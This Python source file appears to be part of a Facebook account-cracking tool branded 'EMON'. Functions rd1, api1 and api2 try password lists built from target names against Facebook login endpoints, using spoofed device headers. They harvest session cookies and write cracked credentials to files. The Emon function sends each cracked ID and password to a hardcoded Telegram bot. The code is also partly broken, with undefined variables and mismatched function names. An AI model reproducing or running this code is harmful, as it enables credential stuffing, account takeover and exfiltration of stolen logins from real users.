def Emon(uid,pas):
    try:
        token = "6716393521:AAFe0NSOVgfDzCrUMQUyvPJWE7YK9QnOMnA"#Add yout token 
        chatid = "5434227549"#Add your Chat Id
        ok_id =str(id+"|"+ps)
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        params = {"chat_id": chatid, "text": ok_id}
        requests.get(url, params=params)
    except:
        pass
   

##-----------GMAIL&RANDOM METHOD---------##  
def rd1(ids,passlist):
    try:
        global ok,loop,sim_id
        sys.stdout.write(f'\r{R}❲{G}𝙀𝙈𝙊𝙉🥰-𝐗𝐃{R}❳{A}-{R}❲{G}%s{R}❳{A}-{R}❲{G}OK{R}❳{A}-{R}❲{G}%s{R}❳ \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        for pas in passlist:
                accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                head = {'User-Agent':sex(),'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
                data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'es_ES','client_country_code':'ES','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
                po = requests.post('https://graph.facebook.com/auth/login', data=data, headers=head).json()
                if 'session_key' in po:
                        uid = str(po['uid'])
                        ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                        ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                        cookie = f"sb={ssbb};{ckkk}"
                        status= lock(uid)
                        if "Active" in status:
                          print(f'\r{R}❲{G}𝙀𝙈𝙊𝙉🥰-𝐗𝐃_OK{R}❳{G} '+uid+f' {R}|{G} '+pas)
                          Emon(uid,pas)
                        print(f"\r{R}❲{G}COOKIE{R}❳{A}->{G} {cookie}")
                        file_path_ok = os.path.join(folder_path, '𝙀𝙈𝙊𝙉-RANDOM-OK.txt')
                        file_path_cookies = os.path.join(folder_path, '𝙀𝙈𝙊𝙉-RANDOM-COOKIE.txt')
                        with open(file_path_ok, 'a') as file_ok, open(file_path_cookies, 'a') as file_cookies:
                            file_ok.write(uid+' | '+pas+'\n')
                            file_cookies.write(uid+' | '+pas+' |-----> '+cookie+'\n')
                        oks.append(uid)
                        break
                elif 'www.facebook.com' in po['error']['message']:
                        uid = str(po['error']['error_data']['uid'])
                        print(f'\r{R}❲{Y}𝙀𝙈𝙊𝙉🥰-CP{R}❳{Y} '+uid+f' {R}|{Y} '+pas+'\033[1;97m')
                        file_path = os.path.join(folder_path, '𝙀𝙈𝙊𝙉-RANDOM-CP.txt')
                        with open(file_path, 'a') as file:
                            file.write(uid+' | '+pas+'\n')
                        cps.append(uid)
                        break
                else:
                    continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        pass

##------------FILE_METHOD_(1)-----------##
def sex():
	fban = random.choice(["FB4A"])
	facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
	fbbv = str(random.randint(10000000, 66666666))
	density = random.choice(['1.0', '1.5', '2.0', '2.5', '3.0'])
	width = random.choice(["720", "1080", "1280"])
	height = random.choice(["720", "1080", "1280", "1440", "1920"])
	fbcr = random.choice(['Nepal_Telecom', 'Banglalink', 'Robi', 'Grameenphone', 'Airtel'])
	fblc = random.choice(["en_US", "en_GB"])
	fbbd = 'Xiaomi'
	fbpn = random.choice(["com.facebook.katana"])
	fbsv = f"{random.randint(4, 13)}.{random.randint(0, 5)}.{random.randint(1, 5)}"
	fbmf = 'Xiaomi'
	build = random.choice(['SKQ1.210216.001','RKQ1.211103.002','SP1A.210812.016','TP1A.220905.001'])
	fbdv = random.choice(["Redmi Note 7", "Redmi Note 8", "Redmi Note 9", "Redmi Note 10", "Redmi 7", "Redmi 8", "Redmi 9", "Redmi 10", "Redmi 9A", "Redmi 9C", "Redmi K20", "Redmi K30", "Redmi K40", "Redmi 5A", "Redmi 6A", "Redmi 7A", "Redmi 8A", "Redmi 9T", "Redmi Note 7 Pro", "Redmi Note 8 Pro", "Redmi Note 4", "Redmi Note 5", "Redmi Note 6 Pro", "Redmi 4X", "Redmi Y2", "Redmi Note 8T"])
	END = f"[FBAN/{str(fban)};FBAV/{str(facebook_version)};FBBV/{str(fbbv)};FBDM/{{density={density},width={width},height={height}}};FBLC/{str(fblc)};FBCR/{str(fbcr)};FBMF/{str(fbmf)};FBBD/{str(fbbd)};FBPN/{str(fbpn)};FBDV/{str(fbdv)};FBSV/{str(fbsv)};FBOP/1;FBCA/armeabi-v7a:armeabi;]"
	ua = f'Davik/2.1.0 (Linux; U; Android {str(fbsv)}; {str(fbdv)} Build/'+str(build)+') '+END
	ua =f'Mozilla/5.0 (Linux; Android {str(fbsv)}; {str(fbdv)} Build/'+str(build)+') '+END
	ua=f'Mozilla/3.0 (Linux; Android {str(fbsv)}; {str(fbdv)} Build/'+str(build)+') '+END
	ua=f'Mozilla/5.0 (Linux; Android {str(fbsv)}/ {str(fbdv)} Chrome/'+str(build)+') '+END
	return ua 

 
def api1(ids,names,passlist):
    try:
        global ok,loop,sim_id
        sys.stdout.write(f'\r{R}❲{G}𝙀𝙈𝙊𝙉-T1{R}❳{A}-{R}❲{G}%s{R}❳{A}-{R}❲{G}OK{R}❳{A}-{R}❲{G}%s{R}❳ \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            head =  {'User-Agent':Sex(),'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'en-US,en;q=0.9','cache-control': 'max-age=0','dpr': '1.649999976158142','referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8','sec-ch-prefers-color-scheme': 'light','sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"','sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.26"','sec-ch-ua-mobile':str(random.randint(2e4, 4e4)),'sec-ch-ua-model':str(random.randint(2e4, 4e4)),'sec-ch-ua-platform': '"Android"','sec-ch-ua-platform-version': '"11.0.0"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent':ua,'viewport-width': '980',}
            data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'es_ES','client_country_code':'ES','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
            po = requests.post('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8&wtsid=rdr_0T3EkpCcdmBbg9nps&refsrc=deprecated&ref_component=mbasic_footer&_rdr',).json()
            if 'session_key' in po:
                    uid = str(po['uid'])
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                    ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                    cookie = f"sb={ssbb};{ckkk}"
                    print(f'\r{R}❲{G} I𝙀𝙈𝙊𝙉🥰-OK{R}❳{G} '+uid+f' {R}|{G} '+pas)
                    Emon(uid,pas)
                    print(f"\r{R}❲{G}COOKIE{R}❳{A}->{G} {cookie}")
                    file_path = os.path.join(folder_path, '𝙀𝙈𝙊𝙉-FILE-M1-OK.txt')
                    open('/sdcard/XD/𝙀𝙈𝙊𝙉-FILE-M1-OK-COOKIE.txt','a').write(uid+' | '+pas+' |------> '+cookie+'\n')
                    with open(file_path, 'a') as file:
                        file.write(uid+' | '+pas+'\n')
                    oks.append(uid)
                    break
            elif 'www.facebook.com' in po['error']['message']:
                    uid = str(po['error']['error_data']['uid'])
                    print(f'\r{R}❲{Y}𝙀𝙈𝙊𝙉🥰-CP{R}❳{Y} '+uid+f' {R}|{Y} '+pas+'\033[1;97m')
                    file_path = os.path.join(folder_path, '𝙀𝙈𝙊𝙉-FILE-M1-CP.txt')
                    with open(file_path, 'a') as file:
                        file.write(uid+' | '+pas+'\n')
                    cps.append(uid)
                    break
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        pass

##------------FILE_METHOD_(2)-----------##
def api2(ids,names,passlist):
    try:
        global ok,loop,sim_id
        sys.stdout.write(f'\r{R}❲{G}𝙀𝙈𝙊𝙉-T2{R}❳{A}-{R}❲{G}%s{R}❳{A}-{R}❲{G}OK{R}❳{A}-{R}❲{G}%s{R}❳ \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            head ={'User-Agent':Sex(),'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'en-US,en;q=0.9','cache-control': 'max-age=0','dpr': '1.649999976158142','referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8','sec-ch-prefers-color-scheme': 'light','sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"','sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.26"','sec-ch-ua-mobile':str(random.randint(2e4, 4e4)),'sec-ch-ua-model':str(random.randint(2e4, 4e4)),'sec-ch-ua-platform': '"Android"','sec-ch-ua-platform-version': '"11.0.0"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent':ua,'viewport-width': '980',}
            data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'es_ES','client_country_code':'ES','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
            po = requests.post('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8&wtsid=rdr_0T3EkpCcdmBbg9nps&refsrc=deprecated&ref_component=mbasic_footer&_rdr',).json()
            if 'session_key' in po:
                    uid = str(po['uid'])
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                    ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                    cookie = f"sb={ssbb};{ckkk}"
                    print(f'\r{R}❲{G}𝙀𝙈𝙊𝙉🥰-OK{R}❳ '+uid+f' {R}|{G} '+pas)
                    
                    print(f"\r{R}❲{G}COOKIE{R}❳{A}->{G} {cookie}")
                    file_path = os.path.join(folder_path, '𝙀𝙈𝙊𝙉-FILE-M2-OK.txt')
                    open('/sdcard/XD/𝙀𝙈𝙊𝙉-FILE-M2-OK-COOKIE.txt','a').write(uid+' | '+pas+' |----> '+cookie+'\n')
                    with open(file_path, 'a') as file:
                        file.write(uid+' | '+pas+'\n')
                    oks.append(uid)
                    break
            elif 'www.facebook.com' in po['error']['message']:
                    uid = str(po['error']['error_data']['uid'])
                    print(f'\r{R}❲{Y}𝙀𝙈𝙊𝙉🥰-CP{R}❳{Y} '+uid+f' {R}|{Y} '+pas+'\033[1;97m')
                    file_path = os.path.join(folder_path, '𝙀𝙈𝙊𝙉-FILE-M2-CP.txt')
                    with open(file_path, 'a') as file:
                        file.write(uid+' | '+pas+'\n')
                    cps.append(uid)
                    break
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        pass
os.system('xdg-open https://t.me/team_x_draco_box_2')
##------------END-------------##

try:Main_𝙀𝙈𝙊𝙉()
except requests.exceptions.ConnectionError:
    print(f'\n\033[1;92m [×] \033[1;91mNo internet connection ...')
except Exception as e:pass
 